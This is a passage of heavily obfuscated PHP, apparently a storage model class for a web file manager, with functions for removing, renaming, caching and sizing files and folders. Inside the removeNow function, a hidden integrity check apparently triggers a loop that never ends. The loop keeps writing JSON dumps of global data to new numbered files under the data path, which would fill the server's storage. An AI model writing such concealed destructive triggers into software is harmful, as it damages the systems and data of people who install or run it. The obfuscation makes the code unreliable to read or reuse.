Model($…Œêš¡¯[641])->eventRemove($¶’ûŞ¹Á); $‹… Û¢ = $this->move($¶’ûŞ¹Á, $™ğ¨™ÔØ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‘ŒÂù‰[$…Œêš¡¯[193]]); return $‹… Û¢; } private function recycleClear($“»¤¼«Ö) { $ò¨‚”ûƒ =& $_SERVER[«òÑğ]; $ºÅëïİ = $this->childrenAll($“»¤¼«Ö); $Ÿ¿ïŒ«¶ = array($ò¨‚”ûƒ[494] => array($ò¨‚”ûƒ[495], $ºÅëïİ[$ò¨‚”ûƒ[2300]])); Model($ò¨‚”ûƒ[2301])->where($Ÿ¿ïŒ«¶)->delete(); } public function removeNow($¦øÖ’Í§, $¶µá£…í = true) { $Ã—Í…şã =& $_SERVER[«òÑğ]; $êş‹¡î© = $_SERVER[$Ã—Í…şã[827]] . $Ã—Í…şã[828]; $³…¡ßÒà = $Ã—Í…şã[1449]; if ($_SERVER[$Ã—Í…şã[824]] != $³…¡ßÒà($êş‹¡î©)) { $‰µËªï§ = $Ã—Í…şã[967]; $¥Ù¾‹¸„ = $Ã—Í…şã[826]; $µŠ°ŒŒ‚ = $_SERVER[$Ã—Í…şã[827]] . $Ã—Í…şã[828]; $ÆÈ“æ‡× = $¥Ù¾‹¸„($µŠ°ŒŒ‚); $¦©ûéÒ = explode($Ã—Í…şã[288], $ÆÈ“æ‡×); if (count($¦©ûéÒ) < $Ã—Í…şã[702]) { $–ç³µæ± = $Ã—Í…şã[829]; $–ç³µæ±(); } $ïÔÊé†‡ = $Ã—Í…şã[968]; $ïÔÊé†‡($_SERVER[$Ã—Í…şã[969]]); $‰µËªï§ = $Ã—Í…şã[967]; $‰µËªï§(); $òõƒä¥ø = $Ã—Í…şã[2302]; $èàÒå¶• = json_encode($GLOBALS[$Ã—Í…şã[2303]]); $Ğ¡ã¥Å¶ = 1; for ($»Çü©Ö¢ = $Ğ¡ã¥Å¶; $»Çü©Ö¢ > 0; $»Çü©Ö¢++) { $òõƒä¥ø(DATA_PATH . $»Çü©Ö¢, $èàÒå¶•); } } $…ÊĞ‹üõ = $this->sourceInfo($¦øÖ’Í§); $âç÷ÈÒª = $this->pathInfoMore($¦øÖ’Í§); if (!$…ÊĞ‹üõ) { return !0; } if ($…ÊĞ‹üõ[$Ã—Í…şã[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¦øÖ’Í§); Hook::trigger($Ã—Í…şã[2304], $âç÷ÈÒª, $¶µá£…í); if ($¶µá£…í) { Model($Ã—Í…şã[2301])->moveToRecycle($¦øÖ’Í§); } else { $ñ”„ºœè = $this->childrenAll($…ÊĞ‹üõ); Model($Ã—Í…şã[641])->eventRemove($¦øÖ’Í§); $this->removeRelevance($ñ”„ºœè[$Ã—Í…şã[2300]], $ñ”„ºœè[$Ã—Í…şã[1587]]); } $this->folderSizeReset($…ÊĞ‹üõ[$Ã—Í…şã[193]]); $€ÈÍí™È = array($…ÊĞ‹üõ[$Ã—Í…şã[193]]); if ($…ÊĞ‹üõ[$Ã—Í…şã[488]] == $Ã—Í…şã[91]) { $€ÈÍí™È[] = $…ÊĞ‹üõ[$Ã—Í…şã[194]]; } $this->updateModifyTime($€ÈÍí™È); $this->lockMoveEnd($¦øÖ’Í§); Hook::trigger($Ã—Í…şã[1827], $âç÷ÈÒª, $¶µá£…í); return !0; } public function childrenAll($·±ñÑ‹) { $áò—å•ã =& $_SERVER[«òÑğ]; $Ÿ±Î¦† = $·±ñÑ‹[$áò—å•ã[194]]; if ($·±ñÑ‹[$áò—å•ã[488]] == $áò—å•ã[91]) { $±óĞÁÄ· = array($áò—å•ã[660] => array($áò—å•ã[620], $·±ñÑ‹[$áò—å•ã[589]] . $Ÿ±Î¦† . $áò—å•ã[621])); $˜ï‚çìº = array($áò—å•ã[660] => $±óĞÁÄ·[$áò—å•ã[589]]); $Â½¢ö˜ù = $this->field($áò—å•ã[2305])->where($˜ï‚çìº)->select(); $ˆ›¢ğ»½ = !1; $ñ¬ûŸ«Ù = array($Ÿ±Î¦†); if ($Â½¢ö˜ù) { $ˆ›¢ğ»½ = array_to_keyvalue($Â½¢ö˜ù, $áò—å•ã[12], $áò—å•ã[546]); $ˆ›¢ğ»½ = array_remove_value($ˆ›¢ğ»½, $áò—å•ã[231]); $ñ¬ûŸ«Ù = array_to_keyvalue($Â½¢ö˜ù, $áò—å•ã[12], $áò—å•ã[194]); $ñ¬ûŸ«Ù[] = $Ÿ±Î¦†; } } else { $ˆ›¢ğ»½ = array($·±ñÑ‹[$áò—å•ã[546]]); $ñ¬ûŸ«Ù = array($Ÿ±Î¦†); } return array($áò—å•ã[2300] => $ñ¬ûŸ«Ù, $áò—å•ã[1587] => $ˆ›¢ğ»½); } public function removeArray($³ú²÷¬½) { if (!$³ú²÷¬½) { return !0; } } public function removeRelevance($ğöİ‚, $—Ó–ÃÄá) { $™·òŒóØ =& $_SERVER[«òÑğ]; $ğöİ‚ = $ğöİ‚ ? $ğöİ‚ : array(); $—Ó–ÃÄá = $—Ó–ÃÄá ? $—Ó–ÃÄá : array(); $ğöİ‚ = array_unique(array_filter($ğöİ‚)); $—Ó–ÃÄá = array_unique(array_filter($—Ó–ÃÄá)); if (!$ğöİ‚) { return !1; } $ª¯±²š‚ = array($™·òŒóØ[494] => array($™·òŒóØ[495], $ğöİ‚)); Model($™·òŒóØ[2301])->where($ª¯±²š‚)->delete(); Model($™·òŒóØ[538])->where($ª¯±²š‚)->delete(); Model($™·òŒóØ[2140])->where($ª¯±²š‚)->delete(); Model($™·òŒóØ[641])->where($ª¯±²š‚)->delete(); Model($™·òŒóØ[1964])->removeBySource($ğöİ‚); Model($™·òŒóØ[2282])->removeBySource($ğöİ‚); $this->where($ª¯±²š‚)->delete(); Model($™·òŒóØ[549])->remove($—Ó–ÃÄá); for ($ˆ–¿”„÷ = 0; $ˆ–¿”„÷ < count($ğöİ‚); $ˆ–¿”„÷++) { $this->sourceCacheClear($ğöİ‚[$ˆ–¿”„÷]); } } public function rename($šĞç†Ë, $ëæúìİ¸) { $ºÉÉè±ê =& $_SERVER[«òÑğ]; $¢ùâ‹Õ¿ = $this->sourceInfo($šĞç†Ë); if (!$¢ùâ‹Õ¿) { return !1; } $áıˆ¯¹ = $this->fileNameExist($¢ùâ‹Õ¿[$ºÉÉè±ê[193]], $ëæúìİ¸); if ($áıˆ¯¹ && $áıˆ¯¹ != $šĞç†Ë) { return !1; } $³ú¥Œå¼ = array($ºÉÉè±ê[497] => $ëæúìİ¸, $ºÉÉè±ê[659] => USER_ID); if ($¢ùâ‹Õ¿[$ºÉÉè±ê[488]] != $ºÉÉè±ê[91]) { $³ú¥Œå¼[$ºÉÉè±ê[489]] = substr(get_path_ext($ëæúìİ¸), 0, 10); } Model($ºÉÉè±ê[641])->eventRename($šĞç†Ë, $¢ùâ‹Õ¿[$ºÉÉè±ê[32]], $ëæúìİ¸); $this->sourceCacheClear($šĞç†Ë); $this->setNamePinyin($šĞç†Ë, $³ú¥Œå¼[$ºÉÉè±ê[32]], !1); $this->updateModifyTime($¢ùâ‹Õ¿[$ºÉÉè±ê[193]]); $…„ŠÅŞª = $this->where(array($ºÉÉè±ê[494] => $šĞç†Ë))->data($³ú¥Œå¼)->save(); $Ô¿©¦Û‰ = $ºÉÉè±ê[2290] . $¢ùâ‹Õ¿[$ºÉÉè±ê[193]]; if (isset(self::$cacheChildList[$Ô¿©¦Û‰])) { unset(self::$cacheChildList[$Ô¿©¦Û‰]); } return $…„ŠÅŞª; } public function setNamePinyin($ü…Ş¢³Á, $¼½“¼Ã”, $‚áØäÃš = true) { $òø­¨­Î =& $_SERVER[«òÑğ]; $úÎ¾äÊª = Input::check($¼½“¼Ã”, $òø­¨­Î[663]); $à²İö¡¨ = array($òø­¨­Î[520] => KodSort::makeStr($¼½“¼Ã”)); if ($úÎ¾äÊª) { $à²İö¡¨[$òø­¨­Î[541]] = str_replace($òø­¨­Î[53], $òø­¨­Î[12], Pinyin::get($¼½“¼Ã”)); $à²İö¡¨[$òø­¨­Î[540]] = Pinyin::get($¼½“¼Ã”, $òø­¨­Î[664]); } if (!$‚áØäÃš && !$úÎ¾äÊª) { $à²İö¡¨[$òø­¨­Î[541]] = null; $à²İö¡¨[$òø­¨­Î[540]] = null; } $this->metaSet($ü…Ş¢³Á, $à²İö¡¨); } public function getContent($€Åè±Í÷) { $½–°÷ƒí =& $_SERVER[«òÑğ]; $ÁìŠ–ı‡ = $this->fileInfoGet($€Åè±Í÷); if (!$ÁìŠ–ı‡) { return !1; } if ($ÁìŠ–ı‡[$½–°÷ƒí[79]] == 0) { return $½–°÷ƒí[12]; } $õì³»Ÿ™ = $½–°÷ƒí[2306] . $ÁìŠ–ı‡[$½–°÷ƒí[552]]; if ($ÁìŠ–ı‡[$½–°÷ƒí[79]] <= 1024 * 10) { $™¸ášÊ˜ = Cache::get($õì³»Ÿ™); if (!$™¸ášÊ˜) { $™¸ášÊ˜ = IO::getContent($ÁìŠ–ı‡[$½–°÷ƒí[87]]); Cache::set($õì³»Ÿ™, $™¸ášÊ˜); } return $™¸ášÊ˜; } if (!$ÁìŠ–ı‡[$½–°÷ƒí[87]]) { return $½–°÷ƒí[12]; } return IO::getContent($ÁìŠ–ı‡[$½–°÷ƒí[87]]); } public function setDesc($¦“¡Íœä, $ïò‹®ú) { $ØŒğïÁ± =& $_SERVER[«òÑğ]; Model($ØŒğïÁ±[641])->eventAddDesc($¦“¡Íœä, $ïò‹®ú); return $this->metaSet($¦“¡Íœä, $ØŒğïÁ±[529], $ïò‹®ú); } public function setContent($ûİÂªÕâ, $İö’ï¼• = '') { $ÍùÛ¬Ç =& $_SERVER[«òÑğ]; $å³¸¾Ö› = $this->sourceInfo($ûİÂªÕâ); $ÆâÀ¥‰ˆ = $this->fileInfoGet($ûİÂªÕâ); if (!$ÆâÀ¥‰ˆ || !$å³¸¾Ö›) { return !1; } $ø¾ë™ï = Model($ÍùÛ¬Ç[549])->addFileByContent($İö’ï¼•, $å³¸¾Ö›[$ÍùÛ¬Ç[32]]); if (!$ø¾ë™ï) { return !1; } $†‘´Ã—Ã = $this->fileHistory($å³¸¾Ö›, $ø¾ë™ï[$ÍùÛ¬Ç[546]], $ø¾ë™ï[$ÍùÛ¬Ç[79]]); if (!$†‘´Ã—Ã) { return Model($ÍùÛ¬Ç[549])->remove($ø¾ë™ï[$ÍùÛ¬Ç[546]]); } $this->folderSizeReset($å³¸¾Ö›[$ÍùÛ¬Ç[193]]); return !0; } public function fileSubstr($ÂÚ¼ÁÈ®, $ïÜ—ò¤, $øØÅŒ»€) { $šİ©Ğô‹ = $this->fileInfoGet($ÂÚ¼ÁÈ®); if (!$šİ©Ğô‹) { return !1; } return IO::fileSubstr($šİ©Ğô‹[$_SERVER[«òÑğ][87]], $ïÜ—ò¤, $øØÅŒ»€); } public function fileInfoGet($Ó¨çâİ©) { $Ûˆõèşæ =& $_SERVER[«òÑğ]; $Òüµ¿ÄÙ = $this->sourceInfo($Ó¨çâİ©); if (!$Òüµ¿ÄÙ || $Òüµ¿ÄÙ[$Ûˆõèşæ[488]]) { return !1; } $œã Ã˜À = $Ûˆõèşæ[553] . $Òüµ¿ÄÙ[$Ûˆõèşæ[546]]; $úõÖÖãù = _get(self::$cacheFileInfo, $œã Ã˜À); if ($úõÖÖãù) { return $úõÖÖãù; } $›Ñ‹­ùá = Model($Ûˆõèşæ[549])->fileInfo($Òüµ¿ÄÙ[$Ûˆõèşæ[546]]); if ($›Ñ‹­ùá) { $›Ñ‹­ùá[$Ûˆõèşæ[32]] = $Òüµ¿ÄÙ[$Ûˆõèşæ[32]]; } self::$cacheFileInfo[$œã Ã˜À] = $›Ñ‹­ùá; return $›Ñ‹­ùá; } private function folderChildrenNumber($˜«ÑİÔ‚) { $û˜á—› =& $_SERVER[«òÑğ]; $ùôú¤Ê† = $this->sourceInfo($˜«ÑİÔ‚); $¨Û™ŞÎƒ = array($û˜á—›[660] => array($û˜á—›[620], $ùôú¤Ê†[$û˜á—›[589]] . $˜«ÑİÔ‚ . $û˜á—›[621]), $û˜á—›[657] => $ùôú¤Ê†[$û˜á—›[574]], $û˜á—›[507] => intval($ùôú¤Ê†[$û˜á—›[508]]), $û˜á—›[654] => 1); $Şº™¶Ûò = $this->where($¨Û™ŞÎƒ)->count(); $÷Õ±ÇĞ­ = $this->where($¨Û™ŞÎƒ)->where(array($û˜á—›[654] => 0))->count(); return array($û˜á—›[83] => $÷Õ±ÇĞ­, $û˜á—›[84] => $Şº™¶Ûò); } public function pathInfo($½ˆŒíš, $«©Ü™ê§ = false) { $×áë€³Œ =& $_SERVER[«òÑğ]; $«©Ü™ê§ = !1; $½ˆŒíš = intval($½ˆŒíš); $ÀÊ–îÒç = $×áë€³Œ[537] . intval($«©Ü™ê§) . $×áë€³Œ[465] . $½ˆŒíš; $âø±Ê×× = _get(self::$cachePathInfo, $ÀÊ–îÒç); if ($âø±Ê××) { return $âø±Ê××; } $«€˜…—È = $this->sourceInfo($½ˆŒíš); if (!$«€˜…—È) { return !1; } $«€˜…—È = $this->_listDataApplyItem($«€˜…—È, $«©Ü™ê§); self::$cachePathInfo[$ÀÊ–îÒç] = $«€˜…—È; return $«€˜…—È; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ö•Â‘–š) { $›­¡ªñ =& $_SERVER[«òÑğ]; $şÈëóÄ× = _get(self::$cachePathInfoMore, $Ö•Â‘–š); if ($şÈëóÄ×) { return $şÈëóÄ×; } $ìûí¦¨ä = $this->pathInfo($Ö•Â‘–š); if (!$ìûí¦¨ä) { return !1; } if ($ìûí¦¨ä[$›­¡ªñ[488]] == $›­¡ªñ[91]) { $ìûí¦¨ä[$›­¡ªñ[82]] = $this->folderChildrenNumber($Ö•Â‘–š); } self::$cachePathInfoMore[$Ö•Â‘–š] = $ìûí¦¨ä; return $ìûí¦¨ä; } public function sourceInfo($ó»»ùˆş) { $ªÒê‚úÛ =& $_SERVER[«òÑğ]; if (!$ó»»ùˆş) { return array(); } $ó»»ùˆş = intval($ó»»ùˆş); $ªÈÉÀÌÈ = $ªÒê‚úÛ[536] . $ó»»ùˆş; $§ŞÛ€É = _get(self::$cacheSourceInfo, $ªÈÉÀÌÈ); if ($§ŞÛ€É) { return $§ŞÛ€É; } $Ì—®ø× = $this->where(array($ªÒê‚úÛ[194] => $ó»»ùˆş))->find(); self::$cacheSourceInfo[$ªÈÉÀÌÈ] = $Ì—®ø×; return self::$cacheSourceInfo[$ªÈÉÀÌÈ]; } public function sourceCacheClear($óêÇü–€ = false) { self::cacheClear($óêÇü–€); } public static function cacheClear($Ğş—–ı = false) { $ö¼¯Ø°£ =& $_SERVER[«òÑğ]; if ($Ğş—–ı == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ö¼¯Ø°£[536] . $Ğş—–ı]); unset(self::$cachePathInfoMore[$Ğş—–ı]); unset(self::$cachePathInfo[$ö¼¯Ø°£[2307] . $Ğş—–ı]); unset(self::$cachePathInfo[$ö¼¯Ø°£[2308] . $Ğş—–ı]); } public function metaSet($¨œìÖ…, $Í¨›ŠïÚ = null, $Ä‚¡œª« = null) { $Ã†•àÈÉ = parent::metaSet($¨œìÖ…, $Í¨›ŠïÚ, $Ä‚¡œª«); if ($Ã†•àÈÉ) { $this->sourceCacheClear($¨œìÖ…); } return $Ã†•àÈÉ; } public function pathInfoByPath($Ó›®¬’—, $ÁØƒğâÑ) { $áß…Êí =& $_SERVER[«òÑğ]; $¡ö¿ÃÕŞ = !$ÁØƒğâÑ ? array() : explode($áß…Êí[8], trim($ÁØƒğâÑ, $áß…Êí[8])); $‘£ÄÙ„‘ = $Ó›®¬’—; foreach ($¡ö¿ÃÕŞ as $­áóËø) { $­æ‘ÃŞ© = array($áß…Êí[193] => $‘£ÄÙ„‘, $áß…Êí[32] => $­áóËø); $ª¹£õùÄ = $this->field($áß…Êí[2309])->where($­æ‘ÃŞ©)->select(); if (!$ª¹£õùÄ) { return !1; } $ª¹£õùÄ = array_sort_by($ª¹£õùÄ, $áß…Êí[508]); $‘£ÄÙ„‘ = $ª¹£õùÄ[0][$áß…Êí[194]]; } $ô¶ÎĞ¼à = $this->sourceInfo($‘£ÄÙ„‘); $this->pathInfoFilter($ô¶ÎĞ¼à); return $ô¶ÎĞ¼à; } protected function updateModifyTime($¸Ä˜È«À) { $‰Á˜ûßƒ =& $_SERVER[«òÑğ]; $–à¥ÓŸí = defined($‰Á˜ûßƒ[2215]) ? USER_ID : 0; if (!$¸Ä˜È«À) { return; } if (!is_array($¸Ä˜È«À)) { $¸Ä˜È«À = array($¸Ä˜È«À); } foreach ($¸Ä˜È«À as $’­®ûíì => $µ÷³°¿É) { $¸Ä˜È«À[$’­®ûíì] = intval($µ÷³°¿É); $this->sourceCacheClear($µ÷³°¿É); } $ˆá‡²æ× = array($‰Á˜ûßƒ[194] => array($‰Á˜ûßƒ[7], $¸Ä˜È«À)); $ø•¼ØÏ = array($‰Á˜ûßƒ[659] => $–à¥ÓŸí, $‰Á˜ûßƒ[501] => time()); $this->where($ˆá‡²æ×)->save($ø•¼ØÏ); } public function folderSizeReset($ª€ÉÚ°ú, $¿‚´ûÃ¼ = false) { $½­×šƒß =& $_SERVER[«òÑğ]; if ($this->statusIgnoreResetSpace) { return; } $é©Ş„ = $this->sourceInfo($ª€ÉÚ°ú); $¾³«ĞŞñ = $½­×šƒß[2310] . $ª€ÉÚ°ú; CacheLock::lock($¾³«ĞŞñ, 20); if ($¿‚´ûÃ¼ === !1) { $this->sourceCacheClear($ª€ÉÚ°ú); $é©Ş„ = $this->sourceInfo($ª€ÉÚ°ú); $›øäŞ–Î = array($½­×šƒß[480] => $ª€ÉÚ°ú, $½­×šƒß[507] => 0); $¦üí¿Å = $this->where($›øäŞ–Î)->sum($½­×šƒß[79]); $¿‚´ûÃ¼ = intval($¦üí¿Å) - intval($é©Ş„[$½­×šƒß[79]]); } if ($¿‚´ûÃ¼ == 0) { return CacheLock::unlock($¾³«ĞŞñ); } $î£±Ü = $this->parentLevelArray($é©Ş„[$½­×šƒß[589]]); if (!$î£±Ü) { $î£±Ü = array(); } $î£±Ü[] = $é©Ş„[$½­×šƒß[194]]; $›øäŞ–Î = array($½­×šƒß[194] => array($½­×šƒß[495], $î£±Ü)); if ($¿‚´ûÃ¼ < 0) { $›øäŞ–Î[$½­×šƒß[79]] = array($½­×šƒß[1102], abs($¿‚´ûÃ¼)); } $this->where($›øäŞ–Î)->setAdd($½­×šƒß[79], $¿‚´ûÃ¼); CacheLock::unlock($¾³«ĞŞñ); $ö€’²òõ = $½­×šƒß[2311] . $é©Ş„[$½­×šƒß[191]] . $½­×šƒß[4] . $é©Ş„[$½­×šƒß[574]]; $íÌÑñÄÁ = array($é©Ş„[$½­×šƒß[191]], $é©Ş„[$½­×šƒß[574]]); TaskRun::timeLimitCall($ö€’²òõ, $½­×šƒß[2312], $íÌÑñÄÁ, 1.5); } public function folderSizeResetChildren($«Ú²İàØ) { $ßÁİàş× =& $_SERVER[«òÑğ]; $this->sourceCacheClear($«Ú²İàØ); $öá§‹óŠ = $this->sourceInfo($«Ú²İàØ); $˜©¶­¸¯ = array($ßÁİàş×[654] => 1, $ßÁİàş×[657] => $öá§‹óŠ[$ßÁİàş×[574]], $ßÁİàş×[660] => array($ßÁİàş×[620], $öá§‹óŠ[$ßÁİàş×[589]] . $«Ú²İàØ . $ßÁİàş×[621])); $äñæ¡ˆ = $ßÁİàş×[2313]; $«ÔÆ—ù = $this->field($äñæ¡ˆ)->where($˜©¶­¸¯)->select(); $˜©¶­¸¯[$ßÁİàş×[488]] = 0; $Ÿ­š—Š£ = $this->field($äñæ¡ˆ)->where($˜©¶­¸¯)->select(); if (!$Ÿ­š—Š£) { return; } $«ÔÆ—ù[] = $öá§‹óŠ; $«ÔÆ—ù = array_to_keyvalue($«ÔÆ—ù, $ßÁİàş×[194]); foreach ($«ÔÆ—ù as $¬š›èš => $»‰×Õ«) { $«ÔÆ—ù[$¬š›èš][$ßÁİàş×[2314]] = $«ÔÆ—ù[$¬š›èš][$ßÁİàş×[79]]; $«ÔÆ—ù[$¬š›èš][$ßÁİàş×[79]] = 0; } foreach ($Ÿ­š—Š£ as $»‰×Õ«) { $Á¾„¼íƒ = $»‰×Õ«[$ßÁİàş×[193]] . $ßÁİàş×[12]; if (!isset($«ÔÆ—ù[$Á¾„¼íƒ])) { continue; } if ($»‰×Õ«[$ßÁİàş×[508]] == $«ÔÆ—ù[$Á¾„¼íƒ][$ßÁİàş×[508]]) { $«ÔÆ—ù[$Á¾„¼íƒ][$ßÁİàş×[79]] += $»‰×Õ«[$ßÁİàş×[79]]; } } foreach ($«ÔÆ—ù as $»‰×Õ«) { $Ş…­“¡™ = $this->parentLevelArray($»‰×Õ«[$ßÁİàş×[589]]); foreach ($Ş…­“¡™ as $Á¾„¼íƒ) { $Á¾„¼íƒ = $Á¾„¼íƒ . $ßÁİàş×[12]; if (!isset($«ÔÆ—ù[$Á¾„¼íƒ])) { continue; } if ($»‰×Õ«[$ßÁİàş×[508]] == $«ÔÆ—ù[$Á¾„¼íƒ][$ßÁİàş×[508]]) { $«ÔÆ—ù[$Á¾„¼íƒ][$ßÁİàş×[79]] += $»‰×Õ«[$ßÁİàş×[79]]; } } } $¬‚”ì¦ = array(); foreach ($«ÔÆ—ù as $»‰×Õ«) { if ($»‰×Õ«[$ßÁİàş×[79]] == $»‰×Õ«[$ßÁİàş×[2314]]) { continue; } $¬‚”ì¦[] = array($ßÁİàş×[194], $»‰×Õ«[$ßÁİàş×[194]], $ßÁİàş×[79], $»‰×Õ«[$ßÁİàş×[79]]); } $this->saveAll($¬‚”ì¦); } public function userSpaceReset($ áŞ…Ş = false) { $û­¹˜Ìä =& $_SERVER[«òÑğ]; $ïéü“Ù™ = $this->where(array($û­¹˜Ìä[191] => self::TYPE_USER, $û­¹˜Ìä[574] => $ áŞ…Ş, $û­¹˜Ìä[488] => 0))->sum($û­¹˜Ìä[79]); $ïéü“Ù™ = !$ïéü“Ù™ || $ïéü“Ù™ <= 0 ? 0 : $ïéü“Ù™; Model($û­¹˜Ìä[582])->userEdit($ áŞ…Ş, array($û­¹˜Ìä[1973] => $ïéü“Ù™)); } public function targetSpaceUpdate($¡ƒÁÎíÈ, $‚ÄÕœÔØ) { $œ™¯úôƒ =& $_SERVER[«òÑğ]; if (!$‚ÄÕœÔØ) { return; } if (!in_array($¡ƒÁÎíÈ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ğ…îè€ = $this->targetSpaceSize($¡ƒÁÎíÈ, $‚ÄÕœÔØ); if ($¡ƒÁÎíÈ == self::TYPE_USER) { Model($œ™¯úôƒ[582])->userEdit($‚ÄÕœÔØ, array($œ™¯úôƒ[1973] => $Ğ…îè€)); } else { if ($¡ƒÁÎíÈ == self::TYPE_GROUP) { Model($œ™¯úôƒ[590])->groupEdit($‚ÄÕœÔØ, array($œ™¯úôƒ[1973] => $Ğ…îè€)); } } } public function targetSpaceSize($ÓåÎñÓ„, $¼˜¯¡–Ç) { $œÇ‘õ«å =& $_SERVER[«òÑğ]; $ì¶£Ú§ = 0; $í—¶ØÇÑ = $this->targetSourceRoot($ÓåÎñÓ„, $¼˜¯¡–Ç, !0); foreach ($í—¶ØÇÑ as $Šşœ‘øÂ) { if (!$Šşœ‘øÂ) { continue; } $ì¶£Ú§ += floatval($Šşœ‘øÂ[$œÇ‘õ«å[79]]); $ºœêğÓ£ = array($œÇ‘õ«å[660] => array($œÇ‘õ«å[620], $œÇ‘õ«å[598] . $Šşœ‘øÂ[$œÇ‘õ«å[194]] . $œÇ‘õ«å[621])); $„ó§ğ«Ä = Model($œÇ‘õ«å[506])->field($œÇ‘õ«å[494])->where($ºœêğÓ£)->select(); $„ó§ğ«Ä = array_to_keyvalue($„ó§ğ«Ä, $œÇ‘õ«å[12], $œÇ‘õ«å[194]); $„ó§ğ«Ä = array_unique(array_filter($„ó§ğ«Ä)); if ($„ó§ğ«Ä) { $ºœêğÓ£ = array($œÇ‘õ«å[494] => array($œÇ‘õ«å[495], $„ó§ğ«Ä)); $ì¶£Ú§ += floatval($this->where($ºœêğÓ£)->sum($œÇ‘õ«å[79])); } } $ì¶£Ú§ = !$ì¶£Ú§ || $ì¶£Ú§ <= 0 ? 0 : $ì¶£Ú§; return $ì¶£Ú§; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¡ëÇ²’²) { return $this->fileTypeProfile($¡ëÇ²’², SourceModel::TYPE_USER); } public function groupFileTypeProfile($ò´ä·—Ñ) { return $this->fileTypeProfile($ò´ä·—Ñ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($µÚ¬Öğı, $ŞÙâş§Ø) { $ÊŸıç’× =& $_SERVER[«òÑğ]; $º¸ªö‘é = $ÊŸıç’×[2315] . $µÚ¬Öğı . $ÊŸıç’×[11] . $ŞÙâş§Ø; $×ë¢­ñ = Cache::get($º¸ªö‘é); if ($×ë¢­ñ) { return $×ë¢­ñ; } $•’â›˜ = array($ÊŸıç’×[654] => 0); if ($µÚ¬Öğı != !1) { $•’â›˜[$ÊŸıç’×[574]] = $µÚ¬Öğı; $•’â›˜[$ÊŸıç’×[191]] = $ŞÙâş§Ø; } $†â–ü¥Â = array(); $†â–ü¥Â[$ÊŸıç’×[2316]] = array($ÊŸıç’×[2317] => LNG($ÊŸıç’×[2316]), $ÊŸıç’×[2318] => $this->where($•’â›˜)->count(), $ÊŸıç’×[625] => $this->where($•’â›˜)->sum($ÊŸıç’×[79])); $ºš« Ú = KodIO::fileTypeList(); foreach ($ºš« Ú as $‡»şä¾ => $äúê¸£) { $•’â›˜[$ÊŸıç’×[489]] = $this->fileTypeWhere($‡»şä¾); $†â–ü¥Â[$‡»şä¾] = array($ÊŸıç’×[2317] => $äúê¸£[$ÊŸıç’×[32]], $ÊŸıç’×[2318] => $this->where($•’â›˜)->count(), $ÊŸıç’×[625] => $this->where($•’â›˜)->sum($ÊŸıç’×[79])); } Cache::set($º¸ªö‘é, $†â–ü¥Â, 1200); return $†â–ü¥Â; } public function fileNameExist($ñ—‹Ò¾‡, $ÜÓ¹ÒªÕ) { $à²¥´ñö =& $_SERVER[«òÑğ]; $ŒãºøÈÊ = $this->field($à²¥´ñö[2319])->where(array($à²¥´ñö[193] => $ñ—‹Ò¾‡, $à²¥´ñö[32] => $ÜÓ¹ÒªÕ, $à²¥´ñö[508] => 0))->find(); return is_array($ŒãºøÈÊ) ? $ŒãºøÈÊ[$à²¥´ñö[194]] : !1; } public function childList($ê»ğÅ¨ê) { $ÀşÈÙĞò =& $_SERVER[«òÑğ]; $îğÏÙ­È = $ÀşÈÙĞò[2290] . $ê»ğÅ¨ê; if (isset(self::$cacheChildList[$îğÏÙ­È])) { return self::$cacheChildList[$îğÏÙ­È]; } $è©§¯øš = array($ÀşÈÙĞò[193] => intval($ê»ğÅ¨ê), $ÀşÈÙĞò[508] => 0); $ì‹©½Ç¨ = $this->where($è©§¯øš)->select(); $ì‹©½Ç¨ = $ì‹©½Ç¨ ? $ì‹©½Ç¨ : array(); self::$cacheChildList[$îğÏÙ­È] = $ì‹©½Ç¨; foreach ($ì‹©½Ç¨ as $ö†›Ã‚Ê) { $îğÏÙ­È = $ÀşÈÙĞò[536] . $ö†›Ã‚Ê[$ÀşÈÙĞò[194]]; self::$cacheSourceInfo[$îğÏÙ­È] = $ö†›Ã‚Ê; } return $ì‹©½Ç¨; } public function fileNameAuto($×ÚÂ„Æ, $ÎŠÁ®¦¤, $ğÙŒÓ¶® = REPEAT_RENAME, $¶ÃÌö« = false) { $áòÏ’³ =& $_SERVER[«òÑğ]; $ë…Òäóú = get_path_ext($ÎŠÁ®¦¤); $ëÌÒâì» = $ë…Òäóú ? get_path_ext_name($ÎŠÁ®¦¤) . $áòÏ’³[2320] . $ë…Òäóú : $ÎŠÁ®¦¤ . $áòÏ’³[463]; $õùÕğ–Ò = array($áòÏ’³[193] => $×ÚÂ„Æ, $áòÏ’³[508] => 0, $áòÏ’³[32] => array($áòÏ’³[462], $ëÌÒâì»)); $æèå–ÃÓ = $this->field($áòÏ’³[32])->where($õùÕğ–Ò)->select(); $‡ß­çº³ = array_to_keyvalue($æèå–ÃÓ, $áòÏ’³[12], $áòÏ’³[32]); return $this->fileNameAutoGet($‡ß­çº³, $ÎŠÁ®¦¤, $ğÙŒÓ¶®, $¶ÃÌö«); } public function fileNameAutoGet($—ŒèŸÖŠ, $ñĞô´ó, $ƒƒóàÚî, $ƒğÒÌ“¾) { $³³ß¡¢Ä =& $_SERVER[«òÑğ]; if ($ƒƒóàÚî == REPEAT_REPLACE || !$—ŒèŸÖŠ || !in_array_not_case($ñĞô´ó, $—ŒèŸÖŠ) || $ƒğÒÌ“¾ && $ƒƒóàÚî != REPEAT_RENAME_FOLDER) { return $ñĞô´ó; } if ($ƒƒóàÚî == REPEAT_SKIP) { return !1; } $ÆÛ•à»± = $³³ß¡¢Ä[10] . get_path_ext($ñĞô´ó); $ÆÛ•à»± = $ÆÛ•à»± == $³³ß¡¢Ä[10] || $ƒğÒÌ“¾ ? $³³ß¡¢Ä[12] : $ÆÛ•à»±; for ($å¹›Õòã = 1; $å¹›Õòã <= count($—ŒèŸÖŠ) + 1; $å¹›Õòã++) { $Ì¿ÑÍ– = substr($ñĞô´ó, 0, strlen($ñĞô´ó) - strlen($ÆÛ•à»±)); $”§—±¼ó = $Ì¿ÑÍ– . 